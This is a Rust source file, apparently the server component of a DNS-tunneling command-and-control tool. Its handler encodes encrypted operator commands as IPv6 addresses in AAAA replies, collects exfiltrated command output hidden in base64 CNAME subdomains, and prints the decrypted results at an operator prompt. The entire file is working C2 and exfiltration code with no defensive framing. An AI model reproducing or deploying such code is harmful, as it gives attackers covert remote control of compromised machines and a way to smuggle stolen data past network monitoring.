use crate::utils;
use dns_server::{DnsName,DnsQuestion,DnsType,DnsRecord};
use std::net::Ipv6Addr;
use std::io::{self, Write};
use crate::crypto;


// Static vector to hold the exfiltrated data trough a cname query
static mut EXFILTRATED_DATA: Vec<String> = Vec::new();
// Static mutable string to hold commands that will be send for execution
pub static mut COMMAND_BUFFER: String = String::new();


// Handle all DNS requests based on record type
pub fn dns_handler(question: &DnsQuestion) -> Vec<DnsRecord> {
    // Create a mutable vector to hold the response records
    let mut response_records = Vec::new();

    // Check what type of DNS query was made
    match question.typ {
        DnsType::A => {

            // If we receive A record request this means that there is no more data
            // to be exfiltrated, print the output and set the static vector to null
            unsafe {

                let temp = EXFILTRATED_DATA.join("");

                let decoded: Vec<u8> = crypto::decrypt(temp);
                if !decoded.is_empty() {
                    // print the received output if any
                    println!("\n{}\n", String::from_utf8(decoded).unwrap());
                    print!("#> ");
                    io::stdout().flush().expect("[!] Could not flush stdout");
                    EXFILTRATED_DATA = Vec::new();
                }
            }

            let record = DnsRecord::A(question.name.clone(), utils::generate_ip());
            response_records.push(record);
        },
        // AAAA requests will be used to get commands to be executed from the client
        // commands will be encrypted and encoded as an IPv6 addresses
        DnsType::AAAA => {
            let msg: String;
            unsafe {
                msg = COMMAND_BUFFER.clone();
            }

            let ipv6_addresses: Vec<String> = utils::ipv6_encode(msg.as_str());

            for address in ipv6_addresses {
                let record = DnsRecord::AAAA(question.name.clone(), address.parse::<Ipv6Addr>().expect("Could not parse ipv6"));
                response_records.push(record);
            }

            unsafe {
                COMMAND_BUFFER = String::new();
            }
        },

        DnsType::Unknown(_) => {
            let record = DnsRecord::Unknown(question.name.clone(), DnsType::TXT);
            response_records.push(record);
        },
        // Cname requests will be used to exfiltrate the encrypted command output
        DnsType::CNAME => {

            // Extract the command output
            let request_domain: String = question.name.to_string().clone();

            // Parse the base64 encoded subdomain to retrieve the exfiltrated data
            let temp: String = utils::parse_data(request_domain.clone());

            if !temp.is_empty() {
                //Save all parts to the static vector, read it only if A record request is received
                unsafe {
                    EXFILTRATED_DATA.push(temp);
                }
            }

            // Return a different cname record in order to avoid filling the response buffer,
            // DNS messages cant be larger than 512 bytes
            let (cname_resp1, cname_resp2) = utils::generate_cnames(request_domain.clone().as_str());

            let record = DnsRecord::CNAME(DnsName::new(cname_resp1.as_str()).unwrap(), DnsName::new(cname_resp2.as_str()).unwrap());
            response_records.push(record);
        }
        _ => {}
    }
    // Return the vector of response records
    response_records
}